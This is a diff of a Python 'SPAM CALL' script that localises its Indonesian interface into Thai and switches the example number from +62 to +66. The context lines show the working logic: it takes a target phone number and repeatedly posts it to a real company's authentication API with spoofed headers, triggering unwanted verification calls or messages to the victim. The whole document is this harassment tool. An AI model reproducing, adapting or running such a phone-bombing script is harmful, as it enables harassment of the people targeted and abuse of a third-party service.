@@ -7,12 +7,12 @@ def balik():
     elif f == "t":
          sys.exit("\033[1;91mexit\033[1;97m")
 os.system("clear")
-print ("\tSPAM CALL V4.0")
-print ("      Coded: \033[1;96mFahmiApz\033[1;97m")
-print ("\033[1;97m*     Github:\033[1;92m github.com/BangDanz\033[1;97m      *")
+print ("\tSPAM โทร")
+print ("      โค๊ด โดย: \033[1;96mFahmiApz\033[1;97m")
+print ("\033[1;97m*     ต้นฉบับGithub:\033[1;92m github.com/BangDanz\033[1;97m      *")
 print()
-print ("\033[90m>\033[1;97m CONTOH: \033[1;92m+62857×××××××××")
-no = input("\033[90m> \033[1;97mNOMOR TARGET: \033[1;92m")
+print ("\033[90m>\033[1;97m ตัวอย่าง: \033[1;92m+66857×××××××××")
+no = input("\033[90m> \033[1;97m เป้าหมาย: \033[1;92m")
 
 ua = {
 "Host": "api.myfave.com",
@@ -30,9 +30,9 @@ for i in range(1,5):
     dat = {"phone":no}
     r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
     if "6c047709f9da4291a568fa84b97b6d47" in r:
-        print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mFAILED")
+        print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mไม่สำเร็จ")
     else:
-        print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mSUCCESS")
+        print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mสำเร็จ")
     time.sleep(100)
 
 balik()
